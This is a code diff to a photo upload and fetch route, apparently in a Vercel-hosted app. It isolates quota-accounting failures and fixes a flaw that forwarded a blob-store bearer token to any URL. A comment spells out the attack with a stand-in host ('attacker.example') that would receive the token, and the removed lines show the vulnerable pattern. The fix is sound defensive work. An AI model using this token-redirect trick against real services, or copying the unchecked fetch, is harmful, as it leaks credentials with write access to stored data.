@@ -78,8 +78,19 @@ export async function POST(request: Request) {
       contentType: m[1],
       addRandomSuffix: false, // deterministic path → re-upload overwrites, idempotent
     });
-    // Only after the write lands, so a failed upload never eats quota.
-    await recordPhoto(own, id, bytes.byteLength);
+
+    // Accounting comes after the write lands, so a failed upload never eats
+    // quota — and it gets its OWN catch, because the bytes are already stored
+    // and billed by this point. Failing the request here would tell the client
+    // the upload failed, leave blobUrl unset, and make it re-upload the same
+    // photo on every future sync. Under-counting by one photo is the cheaper
+    // wrong answer, and the log line is how it gets noticed.
+    try {
+      await recordPhoto(own, id, bytes.byteLength);
+    } catch (err) {
+      logEvent("photo", "usage_write_failed", { owner: ownerTag(own), bytes: bytes.byteLength, err: String(err).slice(0, 120) });
+    }
+
     logEvent("photo", "stored", { owner: ownerTag(own), bytes: bytes.byteLength });
     return Response.json({ url: res.url });
   } catch {
@@ -100,16 +111,29 @@ export async function GET(request: Request) {
   if (!limited.ok) return tooMany();
 
   const url = new URL(request.url).searchParams.get("url") ?? "";
-  let path: string;
+  let target: URL;
   try {
-    path = new URL(url).pathname;
+    target = new URL(url);
   } catch {
     return Response.json({ error: "bad_request" }, { status: 400 });
   }
-  if (!path.startsWith(`/${own}/`)) return forbidden(); // can only read your own owner's blobs
+
+  // The HOST has to be checked before the path, and this is not a nicety.
+  //
+  // The line below sends BLOB_READ_WRITE_TOKEN as a bearer to whatever `url`
+  // names. Without a host check, `?url=https://attacker.example/<your-own-key>/x`
+  // satisfies the path test — the attacker writes the path — and the route
+  // hands a token with read AND write access to the whole blob store straight
+  // to their server. Any signed-in caller could do it, including a stranger
+  // with a library of their own.
+  if (target.protocol !== "https:" || !/(^|\.)blob\.vercel-storage\.com$/.test(target.hostname)) {
+    logEvent("photo", "foreign_host", { owner: ownerTag(own), host: target.hostname.slice(0, 60) });
+    return forbidden();
+  }
+  if (!target.pathname.startsWith(`/${own}/`)) return forbidden(); // only your own owner's blobs
 
   try {
-    const r = await fetch(url, { headers: { Authorization: `Bearer ${TOKEN}` } });
+    const r = await fetch(target, { headers: { Authorization: `Bearer ${TOKEN}` } });
     if (!r.ok) return Response.json({ error: "not_found" }, { status: r.status });
     return new Response(r.body, {
       headers: {
